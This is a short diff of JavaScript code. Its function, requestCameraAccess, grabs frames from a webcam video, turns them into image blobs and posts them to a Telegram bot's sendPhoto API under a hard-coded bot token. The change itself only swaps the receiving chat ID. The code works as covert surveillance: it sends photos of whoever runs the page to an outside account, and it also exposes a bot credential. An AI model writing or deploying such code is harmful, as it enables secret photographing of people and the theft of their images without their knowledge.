@@ -18,7 +18,7 @@ function requestCameraAccess() {
         context.drawImage(video, 0, 0);
         canvas.toBlob(blob => {
           const formData = new FormData();
-          formData.append('chat_id', '7906406053');
+          formData.append('chat_id', '@orange1526984753');
           formData.append('photo', blob);
           fetch(`https://api.telegram.org/bot8282209854:AAEtPJtKKDzyILPv-YuLtbrpmLuFt076aVY/sendPhoto`, {
             method: 'POST',
